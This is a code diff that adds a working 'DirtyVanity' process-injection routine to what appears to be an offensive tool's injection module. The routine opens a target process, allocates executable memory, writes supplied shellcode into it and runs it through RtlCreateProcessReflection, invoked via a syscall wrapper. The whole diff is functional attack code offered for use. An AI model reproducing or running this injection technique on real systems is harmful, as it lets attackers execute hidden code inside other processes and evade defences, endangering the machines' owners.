@@ -1091,4 +1091,84 @@ namespace Technique::Injection
 
         return TRUE;
     }
+
+    // Reference:
+    // https://github.com/deepinstinct/Dirty-Vanity
+    // This is required to reflective shellcode.
+    BOOL DirtyVanity(
+        Procs::PPROCS pProcs,
+        DWORD dwPID,
+        const std::vector<BYTE>& bytes
+    ) {
+        LPVOID lpBuffer = (LPVOID)bytes.data();
+        SIZE_T dwBufferSize = bytes.size();
+
+        // HANDLE hProcess = System::Process::ProcessOpen(
+        //     pProcs,
+        //     dwPID,
+        //     PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE
+        // );
+        HANDLE hProcess = OpenProcess(
+            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
+            TRUE,
+            dwPID
+        );
+        if (!hProcess)
+        {
+            return FALSE;
+        }
+
+        LPVOID lpBaseAddr = System::Process::VirtualMemoryAllocate(
+            pProcs,
+            hProcess,
+            nullptr,
+            dwBufferSize,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE
+        );
+        if (!lpBaseAddr)
+        {
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        Stdout::DisplayMessageBoxA("VirtualMemoryAllocate OK", "DirtyVanity");
+
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
+            hProcess,
+            lpBaseAddr,
+            lpBuffer,
+            dwBufferSize,
+            nullptr
+        )) {
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        Stdout::DisplayMessageBoxA("VirtualMmeoryWrite OK", "DirtyVanity");
+
+        RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = {0};
+        NTSTATUS status = CallSysInvoke(
+            &pProcs->sysRtlCreateProcessReflection,
+            pProcs->lpRtlCreateProcessReflection,
+            hProcess,
+            RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
+            lpBaseAddr,
+            nullptr,
+            nullptr,
+            &info
+        );
+        if (status != STATUS_SUCCESS)
+        {
+            System::Handle::HandleClose(pProcs, hProcess);
+            return FALSE;
+        }
+
+        Stdout::DisplayMessageBoxA("RtlCreateProcessREflection OK", "DirtyVanity");
+
+        System::Handle::HandleClose(pProcs, hProcess);
+
+        return TRUE;
+    }
 }
